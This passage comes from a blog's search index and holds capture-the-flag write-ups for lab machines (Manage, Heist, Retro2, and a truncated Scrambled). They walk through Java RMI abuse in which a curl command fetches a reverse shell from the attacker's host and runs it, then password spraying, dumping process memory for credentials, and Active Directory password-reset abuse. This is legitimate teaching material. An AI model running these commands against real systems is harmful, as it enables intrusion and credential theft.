<SNIP>\n```\n\n![](/img/robocop.gif)","tags":["ADCS","NFS","Roundcube Webmail"],"categories":["vl"]},{"title":"Manage (Linux Easy)","url":"/2025/04/25/Manage/","content":"![](/img/manage.jpg)\n\nManage is a Linux Easy machine starting off with [Java RMI](https://swisskyrepo.github.io/PayloadsAllTheThings/Java%20RMI/) using [beanshooter](https://github.com/qtc-de/beanshooter). After enumeration we see we gather credentials and that authorization on the Remote MBean server isn't required. Using this we are able to get a foothold on the machine. As user `tomcat`, we see other users we can attack in `/etc/passwd`. Trying to escalate our privilege to `useradmin` we have password reuse from the credentials we gathered, but upon entering the password were asked for verification. Looking in `useradmin`'s home we see a backup tar file. Getting it to our machine yields this users home directory backed up. We have a ssh key we can use to get on the box, along with `.google_authenticator` having PINS to try. Doing so gets us sshed on the box. Looking at our users privilege, we see we have `ALL:ALL` on `/usr/sbin/adduser`. Looking at a typical sudoers file we see we can use `admin` as a user, as this group is not present on the box. Upon adding this user, they will in turn be added to the `admin` group allowing just `ALL:ALL`, which gives us root.\n\n## Initial Nmap\n```\nPORT     STATE SERVICE  REASON         VERSION\n22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)                              \n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL/6LNCGTwX42XmhwON6uF7gkwKfdO4iIzYnFD87dWpXiPrNIYgfW0953r40u4j4DAf+PhgdmdKKKE8KIifQaVc=\n|   256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)                            \n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGbGFCw+4cyYAXrdHnPXp2K1ojZhTcQrXPI+pDFW5vkh          \n2222/tcp open  java-rmi syn-ack ttl 63 Java RMI                                             \n| rmi-dumpregistry:                                                                         \n|   jmxrmi                                                                                  \n|     javax.management.remote.rmi.RMIServerImpl_Stub                                        \n|     @127.0.1.1:38941                        \n|     extends                                                                               \n|       java.rmi.server.RemoteStub                                                          \n|       extends                                                                             \n|_        java.rmi.server.RemoteObject                                                      \n|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)                              \n8080/tcp open  http     syn-ack ttl 63 Apache Tomcat 10.1.19                                 \n|_http-favicon: Apache Tomcat                  \n|_http-title: Apache Tomcat/10.1.19            \n| http-methods:                                                                             \n|_  Supported Methods: GET HEAD POST OPTIONS   \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\nLooking at port 2222 specifically. ðŸ‘€\n\n## Java RMI (Remote Method Invocation) and our footHold ðŸ‘Œ\n\n[Java RMI(Remote Method Invocation)](https://swisskyrepo.github.io/PayloadsAllTheThings/Java%20RMI/) is a Java API that allows an object running in one JVM (Java Virtual Machine) to invoke methods on an object running in another JVM, even if they're on different physical machines. RMI provides a mechanism for Java-based distributed computing. We can abuse this with [beanshooter](https://github.com/qtc-de/beanshooter).\n\n![Here We Go!](/img/beans.gif)\n\nWe can first run some enumeration.\n\n```bash\n$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.124.240 2222\n\n[+] Checking available bound names:\n[+]\n[+]     * jmxrmi (JMX endpoint: 127.0.1.1:38941)\n[+]\n[+] Checking for unauthorized access:\n[+]\n[+]     - Remote MBean server does not require authentication.\n[+]       Vulnerability Status: Vulnerable\n[+]\n[+] Checking pre-auth deserialization behavior:\n[+]\n[+]     - Remote MBeanServer rejected the payload class.\n[+]       Vulnerability Status: Non Vulnerable   \n<SNIP>\n[+] Enumerating tomcat users:\n[+]\n[+]     - Listing 2 tomcat users:\n[+]\n[+]             ----------------------------------------\n[+]             Username:  manager\n[+]             Password:  <SNIP>\n[+]             Roles:\n[+]                        Users:type=Role,rolename=\"manage-gui\",database=UserDatabase\n[+]\n[+]             ----------------------------------------\n[+]             Username:  admin\n[+]             Password:  <SNIP>\n[+]             Roles:\n[+]                        Users:type=Role,rolename=\"role1\",database=UserDatabas                     \n```\n![](/img/perfect.gif)\n\nNow we have some credentials. But lets try to get a shell. First we can create a reverse shell and put it in `x` and host it. This will grab our shell.\n\n```bash\n$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.124.240 2222 exec 'curl -o /tmp/x 10.8.4.29/x'\n```\n\nThis the executes our shell.\n\n```bash\n$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.124.240 2222 exec 'bash /tmp/x'\n```\n\nOur foothold appears ðŸ™Œ\n\n```bash\n$ nc -lvnp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.4.29] from (UNKNOWN) [10.10.124.240] 57806\nbash: cannot set terminal process group (597): Inappropriate ioctl for device\nbash: no job control in this shell\ntomcat@manage:/$ id\nid\nuid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)\ntomcat@manage:/$ \n```\n\n![](/img/tom-and-jerry-mafia.gif)\n\n## I'm just a regular Tomcat\n\nAs `tomcat` we look around seeing we have to users we can look at. Going to `/home` we can see a directory `backup` in `useradmin`'s home directory. This has a `backup.tar.gz` we can extract to our machine. \n\n```bash\n$ tomcat@manage:/home/useradmin/backups$ ls\nls\nbackup.tar.gz\n```\nI just base64 encoded and the decoded on my machine. After that we had some directories, including `.ssh`. Using the key we can ssh in as `useradmin`, but upon entering the password it asks for verification.\n\n```bash\n$ ssh -i .ssh/id_ed25519 useradmin@10.10.124.240\n(useradmin@10.10.124.240) Verification code:\n```\nWe also had a `.google_authenticator` file. This held PINS we can use for verification, and after using one or two we get in.\n\n```bash\n$ ssh -i .ssh/id_ed25519 useradmin@10.10.124.240\n(useradmin@10.10.124.240) Verification code: \nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)\n\nLast login: Sat Apr 26 00:29:41 2025 from 10.8.4.29\nuseradmin@manage:~$ id\nuid=1002(useradmin) gid=1002(useradmin) groups=1002(useradmin)\n```\n![](/img/yes.gif)\n\n## PrivEsc\n\nIf we look at our privileges we have `adduser`, trying everything such as appending to the end i.e. `--uid 0` or `--system` didn't yield any results. Yet if we look we groups there wasn't an `admin`, a typical sudoers file looks like the following:\n```bash\n# User privilege specification\nroot\tALL=(ALL:ALL) ALL\n\n# Members of the admin group may gain root privileges\n%admin ALL=(ALL) ALL\n\n# Allow members of group sudo to execute any command\n%sudo\tALL=(ALL:ALL) ALL\n```\nSo in theory if we add a user named `admin` then groups follow when a new user is added. So adding user `admin` would give us the permissions `ALL=(ALL) ALL`. That gets us root.\n\n```bash\nuseradmin@manage:~$ su admin\nPassword: \nadmin@manage:/home/useradmin$ sudo -l\n[sudo] password for admin: \nMatching Defaults entries for admin on manage:\n    env_reset, timestamp_timeout=1440, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser admin may run the following commands on manage:\n    (ALL) ALL\nadmin@manage:/home/useradmin$ sudo su\nroot@manage:/home/useradmin# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n![](/img/robocop.gif)","tags":["Java RMI","TomCat","Sudo Abuse"],"categories":["vl"]},{"title":"Heist (Windows Easy)","url":"/2025/04/06/Heist/","content":"![](/img/heist.png)\n\nHeist is a Windows Easy box, I wanted to take it easy and doing something relaxing and this was very interesting to say the least. This starts out with a website that you're able to login as a guest and read the recent posts. When you do you gather a user name, as well as see an attachment. This attactment is a cisco config file. You're able to deduce what type of hash the passwords are and crack them. From there your able to get a list of users, and then spray to find one allows for winrm access. Upon looking a directories and anything from the norm, you find processes running and a particular `firefox` is running, which can allow for dumping the process memory if its still being used. Using `procdump64.exe`, we're able to dump the process memory and filter through and retrieve the Administrator password.\n\n## Initial Nmap\n```\nPORT    STATE SERVICE       REASON          VERSION\n80/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0\n| http-title: Support Login Page\n|_Requested resource was login.php\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n| http-methods:\n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n445/tcp open  microsoft-ds? syn-ack ttl 127\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-04-06T22:12:43\n|_  start_date: N/A\n|_clock-skew: 1s\n| p2p-conficker:\n|   Checking for Conficker.C or higher...\n|   Check 1 (port 48515/tcp): CLEAN (Timeout)\n|   Check 2 (port 35033/tcp): CLEAN (Timeout)\n|   Check 3 (port 25486/udp): CLEAN (Timeout)\n|   Check 4 (port 29195/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled but not required\n```\n\n## HelpDesk Support, Please Help!\n\nLooking on port 80 we see a site, with the option to `login as guest`. We also find a potential user.\n\n![](/img/haz.png)\n\nWe also see his configuration he attacted so kindly.\n```\nversion 12.2\nno service pad\nservice password-encryption\n!\nisdn switch-type basic-5ess\n!\nhostname ios-1\n!\nsecurity passwords min-length 12\nenable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91\n!\nusername rout3r password 7 0242114B0E143F015F5D1E161713\nusername admin privilege 15 password 7 02375012182C1A1D751618034F36415408\n!\n!\nip ssh authentication-retries 5\nip ssh version 2\n!\n!\nrouter bgp 100\n synchronization\n bgp log-neighbor-changes\n bgp dampening\n network 192.168.0.0Ã‚ mask 300.255.255.0\n timers bgp 3 9\n redistribute connected\n!\nip classless\nip route 0.0.0.0 0.0.0.0 192.168.0.1\n!\n!\naccess-list 101 permit ip any any\ndialer-list 1 protocol ip list 101\n!\nno ip http server\nno ip http secure-server\n!\nline vty 0 4\n session-timeout 600\n authorization exec SSH\n transport input ssh\n```\n\nLooking into [Cisco Passwords](https://community.cisco.com/t5/networking-knowledge-base/understanding-the-differences-between-the-cisco-password-secret/ta-p/3163238) we are able to decrypt these password hashes by finding the hash type. We are able to try them against the user we found `hazard`. When we try them against the site we don't get access.\n\n## SMB for users\n\nUsing our password list we can spray and see which works for our user.\n```\n$ nxc smb 10.10.10.149 -u hazard -p pass.lst\nSMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)\nSMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\\hazard:<SNIP>\n```\nFrom here we can get a list of users.\n```\n$ nxc smb 10.10.10.149 -u hazard -p <SNIP> --rid-brute | grep SidTypeUser | cut -d '\\' -f2 | awk '{print $1}' > users.list\n```\nThen since I have some passwords to try I'll try them against all the users we gathered.\n```\n$ nxc smb 10.10.10.149 -u users.list -p pass.lst --continue-on-success\nSMB                      10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)\nSMB                      10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\\Hazard:<SNIP>\nSMB                      10.10.10.149    445    SUPPORTDESK      [-] Connection Error: Error occurs while reading from remote(104)\nSMB                      10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\\Chase:<SNIP>\n```\n![](/img/Invincible.gif)\n\n## WinRM-ing\n\nWe can also look to see who has WinRM access. \n```\n$ nxc winrm 10.10.10.149 -u users.list -p pass.lst --continue-on-success\nWINRM       10.10.10.149    5985   SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)\n<SNIP>\nWINRM       10.10.10.149    5985   SUPPORTDESK      [+] SupportDesk\\Chase:<SNIP> (Pwn3d!)\n```\nLooks as user `chase` has some access, lets hop on the machine.\n\n## Banking with Chase ðŸ˜‚\n\nAfter getting connected, we look at the usual.\n- Unusual installed programs and directories in C:\n- Services running/Process running ('ps')\n- User permissions and groups\n- etc,etc,etc\n\nLooking into process running we see firefox running, and for that matter they seem to be using it now. So we can dump the memory of this process.\n```\n*Evil-WinRM* PS C:\\Users\\Chase\\Documents> ps\n\nHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n    463      18     2240       5320               364   0 csrss\n    290      13     2224       5076               480   1 csrss\n    357      15     3500      14548              5052   1 ctfmon\n    255      14     3896      13288              3788   0 dllhost\n    166       9     1872       9632       0.02   6672   1 dllhost\n    617      32    29092      57664               968   1 dwm\n   1492      57    23540      79016              3856   1 explorer\n   1164      68   129556     206536       3.42   6344   1 firefox\n    347      19    10168      35328       0.05   6468   1 firefox\n    401      34    30516      89464       0.42   6612   1 firefox\n    378      28    21968      58372       0.19   6884   1 firefox\n    355      25    16396      38740       0.06   7144   1 firefox\n     49       6     1792       4600               784   1 fontdrvhost\n<SNIP>\n```\nUsing `procdump64.exe`, a neat tool from Sysinternals, we can dump the memory of the process.\n```\n*Evil-WinRM* PS C:\\Users\\Chase\\Documents> .\\procdump64.exe -mm 6344 firefox\n\nProcDump v11.0 - Sysinternals process dump utility\nCopyright (C) 2009-2022 Mark Russinovich and Andrew Richards\nSysinternals - www.sysinternals.com\n\n[19:06:16] Dump 1 initiated: C:\\Users\\Chase\\Documents\\firefox.dmp\n[19:06:16] Dump 1 complete: 5 MB written in 0.1 seconds\n[19:06:16] Dump count reached.\n\n*Evil-WinRM* PS C:\\Users\\Chase\\Documents> ls\n\n\n    Directory: C:\\Users\\Chase\\Documents\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----         4/7/2025   7:06 PM        4594512 firefox.dmp\n-a----         4/7/2025   7:05 PM         424856 procdump64.exe\n\n\n*Evil-WinRM* PS C:\\Users\\Chase\\Documents>\n```\n## System Administrator left something\n\nAfter getting the `dmp` to our machine, easiest via SMB server, we can look through the content. Looking for anything related to the machine or users.\n```\n$ strings firefox.log.dmp |less\n<SNIP>\nMOZ_CRASHREPORTER_STRINGS_OVERRIDE=C:\\Program Files\\Mozilla Firefox\\browser\\crashreporter-override.ini\nlocalhost/login.php?login_username=admin@support.htb&login_password=<SNIP>&login=\nDELETE FROM moz_anno_attributes WHERE id IN (\n```\nAlas, we find a POST request with username and password. We can login with the Administrator account now.\n```\n$ evil-winrm -i 10.10.10.149 -u administrator -p <SNIP>\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\nsupportdesk\\administrator\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>\n```\n\n![](/img/robocop.gif)","tags":["Cisco","ProcDump"],"categories":["htb"]},{"title":"Retro2 (Windows Easy)","url":"/2025/04/05/Retro2/","content":"![](/img/retro2.jpg)\n\nRetro2 is a Easy Windows machine, that starts off with `Guest` auth enabled to look at shares finding a Microsoft Access Database file. After finding the user and password we are able to obtain a bloodhound dump. This shows a relatively simple path with some twists, we are able to find a couple of `Pre-Windows` machine and change the password for one. Allowing us to change/reset the password for the computer `ADMWS01$` which has a particular attribute that allows the reset of the password. Once we've done this we are able to add our user to the `Services` group allowing for RDP access. Upon getting a session we find that with the version of Windows Server 2008 we are able to control the full path to a windows registry value that allows us to escalate to `NT AUTHORITY\\SYSTEM`.\n\n\n# Initial Nmap\n```\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)\n| dns-nsid:\n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-08 15:45:22Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc        Microsoft Windows RPC\nService Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb-os-discovery:\n|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1\n|   Computer name: BLN01\n|   NetBIOS computer name: BLN01\\x00\n|   Domain name: retro2.vl\n|   Forest name: retro2.vl\n|   FQDN: BLN01.retro2.vl\n|_  System time: 2024-11-08T16:46:17+01:00\n| smb2-time:\n|   date: 2024-11-08T15:46:14\n|_  start_date: 2024-11-08T15:44:30\n| smb2-security-mode:\n|   2:1:0:\n|_    Message signing enabled and required\n|_clock-skew: mean: 47m06s, deviation: 34m35s, median: 1h07m04s\n\nNSE: Script Post-scanning.\nInitiating NSE at 08:39\nCompleted NSE at 08:39, 0.00s elapsed\nInitiating NSE at 08:39\nCompleted NSE at 08:39, 0.00s elapsed\nInitiating NSE at 08:39\nCompleted NSE at 08:39, 0.00s elapsed\nRead data files from: /usr/share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 109.68 seconds\n           Raw packets sent: 1990 (87.536KB) | Rcvd: 17 (732B)\n```\n\n# SMB\n\nFound LOTS users via brute forcing.\n```\n$ smb retro2.vl -u jay -p '' --rid-brute  | tr -s \" \" | awk -F'\\' '{print $2}' | awk '{print $1}' > users.lst\n\n<SNIP>\nJulie.Martin\nClare.Smith\nLaura.Davies\nRhys.Richards\nLeah.Robinson\nMichelle.Bird\n<SNIP>\n```\nFound MS Access Database. \n\n![](/img/officedb.png)\n\nThis file was password protected, so converting using *office2john* and cracking got us in and found creds.\n\n```\n\n    strLDAP = \"LDAP://OU=staff,DC=retro2,DC=vl\"\n    strUser = \"retro2\\ldapreader\"\n    strPassword = \"<SNIP>\"\n```\n\n### BloodHound \n\nNow we can get a bloodhound dump and look at our attack path. From there the path is relatively simple. We can use `FS01$` or `FS02$`. I'm using `FS01$`.\n![](/img/bloodhound.png)\n\nSeeing as `Pre-Windows` machines use the same password as their hostname, we can check to see if we have an error that indicates a password change is needed. \n```\n$ nxc smb retro2.vl -u 'FS01$' -p fs01                                                                                         \nSMB         10.10.106.109   445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)\nSMB         10.10.106.109   445    BLN01            [-] retro2.vl\\FS01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT\n```\nAs we didn't get a `STATUS_LOGON_FAILURE`, the password for this machine can be reset. We can use `bloodyAD` to set his password.\n```\n$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.106.109 --host retro2.vl -d retro2.vl -u 'ldapreader' -p '<SNIP>' set password 'FS01$' 'Password123!' --oldpass fs01 \n[*] Trying to connect to retro2.vl...\n[+] Connection successful\n[+] Password changed successfully!\n```\n\nThere are 3 ways to abuse the `GenericWrite` permission:\n- Shadow Credentials (applicable with Windows Server 2016  and later)\n- Targeted Kerberoasting(affective if your targets password is weak and crackable)\n- Resource-Based Constrained Delegation\n\nNone of which will work on this 2008 machine. ðŸ˜’\n\nYet the Windows Server 2008 has an attribute, which if writable we can perform a password reset of `ADMWS01$` Computer. This [article](https://windowstechno.com/unicodepwd/) explains some context.\n```\n$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.102.10 --host retro2.vl -d retro2.vl -u 'FS01$' -p 'Password123!' get writable --otype COMPUTER --detail                                                                                    \n[*] Trying to connect to retro2.vl... \n[+] Connection successful \ndistinguishedName: CN=ADMWS01,CN=Computers,DC=retro2,DC=vl\nserviceInstance: CREATE_CHILD\napplicationVersion: CREATE_CHILD\nms-net-ieee-80211-GroupPolicy: CREATE_CHILD\nrpcProfile: CREATE_CHILD\nrpcProfileElement: CREATE_CHILD \nmsieee80211-Policy: CREATE_CHILD \nserviceAdministrationPoint: CREATE_CHILD   \n<SNIP>\nntPwdHistory: WRITE\notherLoginWorkstations: WRITE\nunicodePwd: WRITE <-----\nuserWorkstations: WRITE\nmaxStorage: WRITE\n<SNIP>\n```\nWith the attribute writable, we can change/reset the password for `ADMWS01$`. I found it difficult to do with `bloodyAD` but I used `changepassword.py` from Impacket that got the job done.\n```\n$ changepasswd.py -dc-ip 10.10.102.10 -altuser 'FS01$' -altpass 'Password123!' -newpass 'Password123!' -p rpc-samr 'retro2.vl/ADMWS01$@retro2.vl' -reset -admin\n Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Setting the password of retro2.vl\\ADMWS01$ as retro2.vl\\FS01$\n[*] Connecting to DCE/RPC as retro2.vl\\FS01$\n[*] Password was changed successfully.\n[!] User no longer has valid AES keys for Kerberos, until they change their password again.\n```\nOnce we've done this, we can add `ldapreader` to the `Services` group which will allow him to RDP to the machine.\n```\n$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.102.10 --host retro2.vl -d retro2.vl -u 'ADMWS01$' -p 'Password123!' add groupMember 'Services' 'ldapreader'\n[*] Trying to connect to retro2.vl...\n[+] Connection successful\n[+] ldapreader added to Services\n```\n![](/img/yes.gif)\n## Session as ldapreader\n\nWe can get a session going via RDP.\n```\n$ xfreerdp /v:retro2.vl /u:ldapreader /p:<SNIP> /tls-seclevel:0 +clipboard /dynamic-resolution\n```\n\nI looked around and did some research about Windows Server 2008 R2, finding some articles but I came across something of a `no fix` by [itm4n](https://itm4n.github.io/windows-registry-rpceptmapper-exploit/). Explaining that using `Get-WmiObject Win32_Perf` can query the *Performance counters* of the machine and when doing so the WMI service **should** load a specified DLL that gets us `NT AUTHORITY\\SYSTEM`. \n\n![](/img/great.gif)\n## PrivEsc\n\nOnce downloading the repo, and compiling, we can transfer it over to the machine and execute it. \n\n![](/img/perf.png)\n\n![](/img/robocop.gif)","tags":["Pre-Windows 2000","SMB","No-Fix RPC"],"categories":["vl"]},{"title":"Scrambled (Windows Medium)","url":"/2025/04/01/Scrambled/","content":"![](/img/scrambled.png)\n\nScrambled is a Medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user `ksimpson`. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the `Public` share with the credentials of `ksimpson`, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account `SqlSvc` has a `Service Principal Name` (SPN) associated with it. An attacker can use this information to perform an attack that is knows as `kerberoasting` and get the hash of `SqlSvc`. After cracking the hash and acquiring the credentials for the `SqlSvc` account an attacker can perform a `silver ticket` attack to forge a ticket and impersonate the user `Administrator` on the remote MSSQL service. Enumeration of the database reveals the credentials for user `MiscSvc`, which can be used to enumerate shares finding `IT` share readable. Looking at the files found from the share, reveals a `.NET` application, which is listening on port `4411`. Reverse engineering the application reveals that it is using the insecure `Binary Formatter` class to transmit data, allowing the attacker to upload their own payload and get code execution as `nt authority\\system`. \n\n## Initial Nmap\n```\nPORT      STATE SERVICE       REASON          VERSION\n53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus\n80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0\n88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-01 14:18:04Z)\n135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC \n139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn \n389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) \n445/tcp   open  microsoft-ds? syn-ack ttl 127   \n464/tcp   open  kpasswd5?     syn-ack ttl 127 \n593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 \n636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000 \n3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) \n4411/tcp  open  found?        syn-ack ttl 127\n5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing\n49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC \n49700/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                  \n60880/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                 \n```\n## Port 4411\nSeems to be a custom app maybe?\n```\n$ telnet 10.10.11.168 4411                                                            \nTrying 10.10.11.168...\nConnected to 10.10.11.168.\nEscape character is '^]'.\nSCRAMBLECORP_ORDERS_V1.0.3;\n\n```\nWe'll can come back later.\n\n## HTTP\nUser found from website `ksimpson`. Looking at the password reset page, in short they are changing the password to the username. \n\n![](/img/ksimpson.png)\n\n## SMB (Authenticating Through Kerberos)\nUsing kerberos to check if user is valid with the FQDN.\n```\n$ nxc smb dc1.scrm.local -k -u ksimpson -p ksimpson                \nSMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)\nSMB         dc1.scrm.local  445    dc1              [+] scrm.local\\ksimpson:ksimpson\n```\nWe can look at shares.\n```\n$ nxc smb dc1.scrm.local -k -u ksimpson -p ksimpson --shares\nSMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)\nSMB         dc1.scrm.local  445    dc1              [+] scrm.local\\ksimpson:ksimpson \nSMB         dc1.scrm.local  445    dc1              [*] Enumerated shares\nSMB         dc1.scrm.local  445    dc1              Share           Permissions     Remark\nSMB         dc1.scrm.local  445    dc1              -----           -----------     ------\nSMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote Admin\nSMB         dc1.scrm.local  445    dc1              C$                              Default share\nSMB         dc1.scrm.local  445    dc1              HR                              \nSMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPC\nSMB         dc1.scrm.local  445    dc1              IT                              \nSMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share \nSMB         dc1.scrm.local  445    dc1              Public          READ            \nSMB         dc1.scrm.local  445    dc1              Sales                           \nSMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share\n```\nLooking at them with smbclient, Public is the only interesting one we can read.\n```\nimpacket-smbclient 'scrm.local/ksimpson:ksimpson@dc1.scrm.local' -k -no-pass\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\nType help for list of commands\n# use Public\n# ls\ndrw-rw-rw-          0  Thu Nov  4 17:23:19 2021 .\ndrw-rw-rw-          0  Thu Nov  4 17:23:19 2021 ..\n-rw-rw-rw-     630106  Fri Nov  5 12:45:07 2021 Network Security Changes.pdf\n```\nUpon grabbing and reading we see that there was a previous attack where an attacker targeted SQL. We will try that soon enough!\n![](/img/kerb.png)\n\n## Kerberoasting cuz We care!!\nLooking at what SPNs are running under our user we find MSSQL associated with our user.\n```\n$ GetUserSPNs.py -dc-host dc1.scrm.local -k 'scrm.local/ksimpson:ksimpson'\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\n[-] CCache file is not found. Skipping...\nServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation \n----------------------------  ------  --------  --------------------------  --------------------------  ----------\nMSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 11:32:02.351452  2025-03-30 19:26:14.609217             \nMSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 11:32:02.351452  2025-03-30 19:26:14.609217\n```\nWe can request these and the try to crack. Which this gives a cleartext password for the `svcsql` account.  \n\n## Silver Ticket Attacks\n\nMSSQL is running, so we can forge a silver ticket and connect 